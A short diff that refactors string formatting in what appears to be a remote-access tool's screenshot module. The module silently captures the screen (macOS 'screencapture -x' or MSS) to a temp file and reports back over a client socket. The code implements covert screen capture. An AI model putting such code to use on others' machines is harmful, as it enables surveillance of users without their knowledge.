@@ -13,7 +13,7 @@ o = os.path.join(temp,'fs.jpg')
 try:
     with MSS() as screenshotter:
         if osx_client():
-            result=run_command('screencapture -x {}'.format(o))
+            result = run_command(f'screencapture -x {o}')
             if not no_error(result):
                 screenshotter.max_displays = 32
                 next(screenshotter.save(mon=-1, output=o))
@@ -22,5 +22,5 @@ try:
             next(screenshotter.save(mon=-1, output=o))
         send(client_socket,'[+] Screenshot has been taken!')
 except ScreenshotError as ex:
-    err = "ERROR: {}".format(ex)
+    err = f"ERROR: {ex}"
     send(client_socket,err)
